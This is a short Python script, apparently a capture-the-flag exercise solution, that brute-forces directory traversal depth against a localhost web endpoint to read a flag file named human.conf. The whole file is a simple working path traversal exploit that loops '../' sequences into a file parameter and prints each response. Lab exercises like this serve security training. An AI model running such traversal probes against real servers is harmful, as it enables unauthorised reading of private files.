# There is a directory traversal vulnerability in the
# following page http://127.0.0.1:8082/humantechconfig?file=human.conf
# Write a script which will attempt various levels of directory
# traversal to find the right amount that will give access
# to the root directory. Inside will be a human.conf with the flag.


import urllib.request

urlA = 'http://127.0.0.1:8082/humantechconfig?file='
urlB = '../'
urlC = 'human.conf'


for x in range(100):
  urlB = urlB + '../'
  url = urlA + urlB + urlC
  req = urllib.request.urlopen(url)
  req = req.read()
  print(req)
